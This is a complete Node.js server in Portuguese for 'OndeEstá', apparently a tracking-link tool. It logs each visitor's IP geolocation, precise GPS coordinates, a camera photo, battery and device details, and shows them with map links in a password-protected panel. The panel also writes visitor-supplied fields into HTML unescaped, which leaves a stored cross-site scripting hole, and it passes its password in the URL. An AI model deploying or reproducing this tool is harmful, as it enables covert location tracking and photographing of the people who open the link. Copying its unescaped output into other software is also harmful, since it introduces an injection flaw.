const http = require("http");
const fs = require("fs");
const path = require("path");

const PORTA = process.env.PORT || 3000;
const SENHA_PAINEL = process.env.SENHA || "mude-esta-senha";
const ARQUIVO_LOGS = path.join(__dirname, "logs.json");
const PASTA_FOTOS = path.join(__dirname, "fotos");

if (!fs.existsSync(PASTA_FOTOS)) fs.mkdirSync(PASTA_FOTOS, { recursive: true });

function lerLogs() {
  try { return JSON.parse(fs.readFileSync(ARQUIVO_LOGS, "utf8")); }
  catch { return []; }
}

function salvarLogs(logs) {
  fs.writeFileSync(ARQUIVO_LOGS, JSON.stringify(logs, null, 2));
}

function salvarLog(registro) {
  const logs = lerLogs();
  registro.id = Date.now() + "_" + Math.random().toString(36).slice(2, 8);
  logs.unshift(registro);
  salvarLogs(logs);
}

function pegarIp(req) {
  const xff = req.headers["x-forwarded-for"];
  if (xff) return xff.split(",")[0].trim();
  return (req.socket.remoteAddress || "").replace("::ffff:", "");
}

async function geolocalizarIp(ip) {
  if (!ip || ip.startsWith("127.") || ip === "::1" || ip.startsWith("192.168.") || ip.startsWith("10.")) {
    return { aviso: "IP local/privado (teste na rede local)" };
  }
  try {
    const r = await fetch(
      `http://ip-api.com/json/${ip}?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting,query&lang=pt-BR`
    );
    const d = await r.json();
    if (d.status !== "success") return { aviso: "Não foi possível localizar o IP" };
    return {
      pais: d.country, estado: d.regionName, cidade: d.city, cep: d.zip,
      latitude_aprox: d.lat, longitude_aprox: d.lon, provedor: d.isp,
      organizacao: d.org, rede_as: d.as, e_celular: d.mobile,
      e_proxy_vpn: d.proxy, e_hospedagem: d.hosting,
    };
  } catch { return { aviso: "Falha na consulta de geolocalização por IP" }; }
}

function salvarFoto(base64) {
  if (!base64 || typeof base64 !== "string" || !base64.startsWith("data:image")) return null;
  const id = Date.now() + "_" + Math.random().toString(36).slice(2, 8);
  const nome = id + ".jpg";
  const dados = base64.replace(/^data:image\/\w+;base64,/, "");
  fs.writeFileSync(path.join(PASTA_FOTOS, nome), Buffer.from(dados, "base64"));
  return nome;
}

function lerCorpo(req, limite) {
  return new Promise((resolve) => {
    let corpo = "";
    let tam = 0;
    req.on("data", (c) => {
      tam += c.length;
      if (tam > limite) { req.destroy(); return; }
      corpo += c;
    });
    req.on("end", () => resolve(corpo));
  });
}

function verificarSenha(url) {
  return url.searchParams.get("senha") === SENHA_PAINEL;
}

function gerarPainel(logs) {
  const totalAcessos = logs.length;
  const comGps = logs.filter(l => l.localizacao_precisa && typeof l.localizacao_precisa === "object").length;
  const comFoto = logs.filter(l => l.foto && l.foto !== "não autorizada").length;
  const ipsUnicos = new Set(logs.map(l => l.ip)).size;

  const linhas = logs.map((l, i) => {
    const g = l.geo_por_ip || {};
    const p = l.localizacao_precisa;
    const temGps = p && typeof p === "object" && p.latitude != null;

    let localHtml = "";
    if (temGps) {
      localHtml += `<a href="https://www.google.com/maps/search/?api=1&query=${p.latitude},${p.longitude}" target="_blank" class="btn-mapa gps">📍 GPS PRECISO (±${p.precisao_metros || "?"} m)</a>`;
    }
    if (g.latitude_aprox != null) {
      localHtml += `<a href="https://www.google.com/maps/search/?api=1&query=${g.latitude_aprox},${g.longitude_aprox}" target="_blank" class="btn-mapa aprox">📍 Aproximado (IP)</a>`;
    }
    if (!localHtml) localHtml = `<span class="sem-dado">Sem coordenadas</span>`;

    const locTexto = g.cidade ? `${g.cidade}, ${g.estado} - ${g.pais}` : (g.aviso || "");
    const provedorTexto = g.provedor || "";

    const fotoHtml = l.foto && l.foto !== "não autorizada"
      ? `<img src="/fotos/${l.foto}" class="foto-captura" onclick="this.classList.toggle('expandida')">`
      : `<span class="sem-dado">Sem foto</span>`;

    const bat = l.bateria && typeof l.bateria === "object"
      ? `<span class="tag">🔋 ${l.bateria.nivel} ${l.bateria.carregando ? "⚡" : ""}</span>` : "";

    const ap = l.aparelho || {};
    const vpn = g.e_proxy_vpn ? `<span class="tag alerta">⚠️ VPN/Proxy</span>` : "";
    const celular = g.e_celular ? `<span class="tag">📱 Rede móvel</span>` : "";
    const hosting = g.e_hospedagem ? `<span class="tag alerta">🖥️ Hospedagem/DC</span>` : "";

    const ua = l.user_agent || "";
    let dispositivo = "Desconhecido";
    if (ua.includes("iPhone")) dispositivo = "iPhone";
    else if (ua.includes("Android")) dispositivo = "Android";
    else if (ua.includes("Windows")) dispositivo = "Windows";
    else if (ua.includes("Mac")) dispositivo = "Mac";
    else if (ua.includes("Linux")) dispositivo = "Linux";

    const logLimpo = Object.assign({}, l);
    if (logLimpo.foto && logLimpo.foto !== "não autorizada") logLimpo.foto = "[" + logLimpo.foto + "]";

    const idLog = l.id || i;

    return `<article class="log-item" data-id="${idLog}">
      <div class="log-header">
        <div>
          <strong>${l.data}</strong>
          <span class="ip-badge">${l.ip}</span>
          <span class="tag dispositivo">${dispositivo}</span>
          ${vpn}${celular}${hosting}${bat}
        </div>
        <button class="btn-excluir" onclick="excluirLog('${idLog}')" title="Excluir">🗑️</button>
      </div>
      <div class="log-local">
        ${locTexto ? `<div class="loc-texto">📌 ${locTexto}</div>` : ""}
        ${provedorTexto ? `<div class="loc-provedor">🌐 ${provedorTexto}</div>` : ""}
        <div class="mapas">${localHtml}</div>
      </div>
      <div class="log-foto">${fotoHtml}</div>
      <div class="log-aparelho">
        ${ap.tela ? `<span class="tag">🖥️ ${ap.tela}</span>` : ""}
        ${ap.gpu && ap.gpu !== "N/A" ? `<span class="tag">🎮 ${ap.gpu}</span>` : ""}
        ${ap.fuso_horario ? `<span class="tag">🕐 ${ap.fuso_horario}</span>` : ""}
        ${ap.conexao ? `<span class="tag">📶 ${ap.conexao}</span>` : ""}
      </div>
      <details><summary>JSON completo</summary><pre>${JSON.stringify(logLimpo, null, 2)}</pre></details>
    </article>`;
  }).join("");

  return `<!doctype html><html lang="pt-BR"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Painel - OndeEstá</title>
<style>
  :root { --bg: #0f1117; --card: #1a1d27; --border: #2a2d3a; --text: #e4e4e7;
    --muted: #888; --accent: #3b82f6; --danger: #ef4444; --success: #22c55e; }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: system-ui, -apple-system, sans-serif; background: var(--bg);
    color: var(--text); max-width: 900px; margin: 0 auto; padding: 1rem; }
  h1 { font-size: 1.4rem; margin-bottom: .5rem; }
  .topo { display: flex; justify-content: space-between; align-items: center;
    flex-wrap: wrap; gap: .8rem; margin-bottom: 1rem; }
  .stats { display: flex; gap: .6rem; flex-wrap: wrap; }
  .stat { background: var(--card); border: 1px solid var(--border); border-radius: 10px;
    padding: .6rem 1rem; text-align: center; min-width: 100px; }
  .stat-num { font-size: 1.5rem; font-weight: 700; color: var(--accent); }
  .stat-label { font-size: .72rem; color: var(--muted); text-transform: uppercase; letter-spacing: .5px; }
  .acoes-topo { display: flex; gap: .5rem; flex-wrap: wrap; align-items: center; }
  .btn { border: none; border-radius: 8px; padding: .5rem 1rem; font-size: .85rem;
    cursor: pointer; font-weight: 500; transition: opacity .2s; }
  .btn:hover { opacity: .85; }
  .btn-danger { background: var(--danger); color: #fff; }
  .btn-accent { background: var(--accent); color: #fff; }
  input[type=text] { background: var(--card); border: 1px solid var(--border); color: var(--text);
    border-radius: 8px; padding: .5rem .8rem; font-size: .85rem; width: 200px; }
  input::placeholder { color: var(--muted); }
  .log-item { background: var(--card); border: 1px solid var(--border); border-radius: 12px;
    padding: 1rem; margin: .8rem 0; transition: border-color .2s; }
  .log-item:hover { border-color: var(--accent); }
  .log-item.selecionado { border-color: var(--danger); background: #1f1215; }
  .log-header { display: flex; justify-content: space-between; align-items: flex-start;
    gap: .5rem; flex-wrap: wrap; margin-bottom: .5rem; }
  .log-header strong { font-size: .95rem; }
  .ip-badge { background: #2563eb22; color: var(--accent); padding: .15rem .5rem;
    border-radius: 4px; font-size: .8rem; font-family: monospace; margin-left: .3rem; }
  .btn-excluir { background: none; border: 1px solid var(--border); border-radius: 6px;
    color: var(--muted); cursor: pointer; padding: .3rem .5rem; font-size: .85rem;
    transition: all .2s; flex-shrink: 0; }
  .btn-excluir:hover { border-color: var(--danger); color: var(--danger); }
  .tag { display: inline-block; background: #ffffff0a; border: 1px solid var(--border);
    padding: .15rem .5rem; border-radius: 4px; font-size: .75rem; margin: .15rem .2rem .15rem 0; }
  .tag.alerta { border-color: #f59e0b55; color: #fbbf24; }
  .tag.dispositivo { border-color: #8b5cf655; color: #a78bfa; }
  .log-local { margin: .5rem 0; }
  .loc-texto { font-size: .9rem; font-weight: 500; margin-bottom: .2rem; }
  .loc-provedor { font-size: .8rem; color: var(--muted); margin-bottom: .4rem; }
  .mapas { display: flex; flex-wrap: wrap; gap: .4rem; }
  .btn-mapa { display: inline-block; padding: .4rem .7rem; border-radius: 6px;
    text-decoration: none; font-size: .8rem; font-weight: 500; transition: opacity .2s; }
  .btn-mapa:hover { opacity: .85; }
  .btn-mapa.gps { background: var(--success); color: #fff; }
  .btn-mapa.aprox { background: var(--accent); color: #fff; }
  .sem-dado { color: var(--muted); font-size: .82rem; font-style: italic; }
  .log-foto { margin: .5rem 0; }
  .foto-captura { max-width: 120px; border-radius: 8px; cursor: pointer;
    box-shadow: 0 2px 8px rgba(0,0,0,.3); transition: max-width .3s; }
  .foto-captura.expandida { max-width: 100%; }
  .log-aparelho { margin: .4rem 0; }
  details { margin-top: .5rem; }
  details summary { cursor: pointer; color: var(--accent); font-size: .82rem; }
  pre { background: #0d0f14; padding: .8rem; overflow: auto; border-radius: 6px;
    font-size: .72rem; margin-top: .4rem; color: #aaa; border: 1px solid var(--border); }
  .vazio { text-align: center; padding: 3rem; color: var(--muted); }
  .sel-bar { display: none; position: fixed; bottom: 0; left: 0; right: 0;
    background: #1a1d27ee; backdrop-filter: blur(8px); border-top: 1px solid var(--border);
    padding: .8rem; text-align: center; z-index: 10; }
  .sel-bar.visivel { display: flex; justify-content: center; align-items: center; gap: 1rem; }
  @media(max-width:600px) {
    .stats { width: 100%; } .stat { flex: 1; min-width: 70px; padding: .4rem .5rem; }
    .stat-num { font-size: 1.1rem; } input[type=text] { width: 100%; }
  }
</style></head><body>

<div class="topo">
  <div>
    <h1>📋 OndeEstá — Painel</h1>
    <span style="color:var(--muted);font-size:.8rem">${totalAcessos} registro${totalAcessos !== 1 ? "s" : ""}</span>
  </div>
  <div class="acoes-topo">
    <input type="text" id="busca" placeholder="Filtrar por IP, cidade..." oninput="filtrar()">
    <button class="btn btn-accent" onclick="toggleSelecao()">☑️ Selecionar</button>
    <button class="btn btn-danger" onclick="excluirTodos()">🗑️ Limpar tudo</button>
  </div>
</div>

<div class="stats">
  <div class="stat"><div class="stat-num">${totalAcessos}</div><div class="stat-label">Acessos</div></div>
  <div class="stat"><div class="stat-num">${ipsUnicos}</div><div class="stat-label">IPs únicos</div></div>
  <div class="stat"><div class="stat-num">${comGps}</div><div class="stat-label">Com GPS</div></div>
  <div class="stat"><div class="stat-num">${comFoto}</div><div class="stat-label">Com Foto</div></div>
</div>

<div id="lista">${linhas || '<div class="vazio"><p>Nenhum acesso registrado ainda.</p></div>'}</div>

<div id="sel-bar" class="sel-bar">
  <span id="sel-count">0 selecionados</span>
  <button class="btn btn-danger" onclick="excluirSelecionados()">🗑️ Excluir selecionados</button>
  <button class="btn" style="background:var(--border);color:var(--text)" onclick="cancelarSelecao()">Cancelar</button>
</div>

<script>
  var SENHA = new URLSearchParams(location.search).get("senha");
  var modoSelecao = false;
  var selecionados = new Set();

  function filtrar() {
    var termo = document.getElementById("busca").value.toLowerCase();
    document.querySelectorAll(".log-item").forEach(function(el) {
      el.style.display = el.textContent.toLowerCase().includes(termo) ? "" : "none";
    });
  }

  function toggleSelecao() {
    modoSelecao = !modoSelecao;
    selecionados.clear();
    atualizarSelBar();
    document.querySelectorAll(".log-item").forEach(function(el) {
      el.classList.remove("selecionado");
      if (modoSelecao) {
        el.style.cursor = "pointer";
        el.onclick = function() {
          var id = el.dataset.id;
          if (selecionados.has(id)) { selecionados.delete(id); el.classList.remove("selecionado"); }
          else { selecionados.add(id); el.classList.add("selecionado"); }
          atualizarSelBar();
        };
      } else {
        el.style.cursor = "";
        el.onclick = null;
      }
    });
  }

  function atualizarSelBar() {
    var bar = document.getElementById("sel-bar");
    if (modoSelecao) {
      bar.classList.add("visivel");
      document.getElementById("sel-count").textContent = selecionados.size + " selecionado" + (selecionados.size !== 1 ? "s" : "");
    } else {
      bar.classList.remove("visivel");
    }
  }

  function cancelarSelecao() {
    modoSelecao = false;
    selecionados.clear();
    document.querySelectorAll(".log-item").forEach(function(el) {
      el.classList.remove("selecionado");
      el.style.cursor = "";
      el.onclick = null;
    });
    atualizarSelBar();
  }

  function excluirLog(id) {
    if (!confirm("Excluir este registro?")) return;
    fetch("/painel/excluir?senha=" + SENHA, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ ids: [id] }),
    }).then(function() { location.reload(); });
  }

  function excluirSelecionados() {
    if (selecionados.size === 0) return alert("Nenhum registro selecionado.");
    if (!confirm("Excluir " + selecionados.size + " registro(s)?")) return;
    fetch("/painel/excluir?senha=" + SENHA, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ ids: Array.from(selecionados) }),
    }).then(function() { location.reload(); });
  }

  function excluirTodos() {
    if (!confirm("EXCLUIR TODOS os registros? Isso não pode ser desfeito!")) return;
    fetch("/painel/excluir-todos?senha=" + SENHA, { method: "POST" })
      .then(function() { location.reload(); });
  }
</script>
</body></html>`;
}

const servidor = http.createServer(async (req, res) => {
  const url = new URL(req.url, `http://${req.headers.host}`);

  if (req.method === "GET" && url.pathname === "/") {
    try {
      const conteudo = fs.readFileSync(path.join(__dirname, "public", "index.html"));
      res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
      res.end(conteudo);
    } catch {
      res.writeHead(500);
      res.end("Erro ao carregar");
    }
    return;
  }

  if (req.method === "GET" && url.pathname.startsWith("/fotos/")) {
    const nome = path.basename(url.pathname);
    const caminho = path.join(PASTA_FOTOS, nome);
    try {
      const img = fs.readFileSync(caminho);
      res.writeHead(200, { "Content-Type": "image/jpeg", "Cache-Control": "public, max-age=86400" });
      res.end(img);
    } catch {
      res.writeHead(404);
      res.end("Foto não encontrada");
    }
    return;
  }

  if (req.method === "POST" && url.pathname === "/coletar") {
    const corpo = await lerCorpo(req, 10 * 1024 * 1024);
    let cliente = {};
    try { cliente = JSON.parse(corpo); } catch {}
    const ip = pegarIp(req);
    const arquivoFoto = salvarFoto(cliente.foto);
    const registro = {
      data: new Date().toLocaleString("pt-BR", { timeZone: "America/Sao_Paulo" }),
      ip,
      geo_por_ip: await geolocalizarIp(ip),
      user_agent: req.headers["user-agent"] || "",
      idioma: req.headers["accept-language"] || "",
      referer: req.headers["referer"] || "",
      aparelho: cliente.aparelho || {},
      bateria: cliente.bateria || "N/A",
      localizacao_precisa: cliente.gps || "não autorizada",
      foto: arquivoFoto || "não autorizada",
    };
    salvarLog(registro);
    res.writeHead(200, { "Content-Type": "application/json" });
    res.end(JSON.stringify({ ok: true }));
    return;
  }

  if (req.method === "GET" && url.pathname === "/painel") {
    if (!verificarSenha(url)) {
      res.writeHead(401, { "Content-Type": "text/html; charset=utf-8" });
      res.end("<h3>Senha incorreta.</h3><p>Use /painel?senha=SUA_SENHA</p>");
      return;
    }
    res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
    res.end(gerarPainel(lerLogs()));
    return;
  }

  if (req.method === "POST" && url.pathname === "/painel/excluir") {
    if (!verificarSenha(url)) {
      res.writeHead(401, { "Content-Type": "application/json" });
      res.end(JSON.stringify({ erro: "Senha incorreta" }));
      return;
    }
    const corpo = await lerCorpo(req, 1024 * 1024);
    let dados = {};
    try { dados = JSON.parse(corpo); } catch {}
    const idsParaExcluir = new Set(dados.ids || []);
    if (idsParaExcluir.size === 0) {
      res.writeHead(400, { "Content-Type": "application/json" });
      res.end(JSON.stringify({ erro: "Nenhum ID informado" }));
      return;
    }
    let logs = lerLogs();
    const logsRemovidos = logs.filter(l => idsParaExcluir.has(l.id));
    logsRemovidos.forEach(l => {
      if (l.foto && l.foto !== "não autorizada") {
        try { fs.unlinkSync(path.join(PASTA_FOTOS, l.foto)); } catch {}
      }
    });
    logs = logs.filter(l => !idsParaExcluir.has(l.id));
    salvarLogs(logs);
    res.writeHead(200, { "Content-Type": "application/json" });
    res.end(JSON.stringify({ ok: true, removidos: logsRemovidos.length }));
    return;
  }

  if (req.method === "POST" && url.pathname === "/painel/excluir-todos") {
    if (!verificarSenha(url)) {
      res.writeHead(401, { "Content-Type": "application/json" });
      res.end(JSON.stringify({ erro: "Senha incorreta" }));
      return;
    }
    const logs = lerLogs();
    logs.forEach(l => {
      if (l.foto && l.foto !== "não autorizada") {
        try { fs.unlinkSync(path.join(PASTA_FOTOS, l.foto)); } catch {}
      }
    });
    salvarLogs([]);
    res.writeHead(200, { "Content-Type": "application/json" });
    res.end(JSON.stringify({ ok: true }));
    return;
  }

  if (url.pathname === "/favicon.ico") { res.writeHead(204); res.end(); return; }

  res.writeHead(404);
  res.end("Não encontrado");
});

servidor.listen(PORTA, "0.0.0.0", () => {
  console.log(`\n  Página:  http://localhost:${PORTA}/`);
  console.log(`  Painel:  http://localhost:${PORTA}/painel?senha=${SENHA_PAINEL}\n`);
});
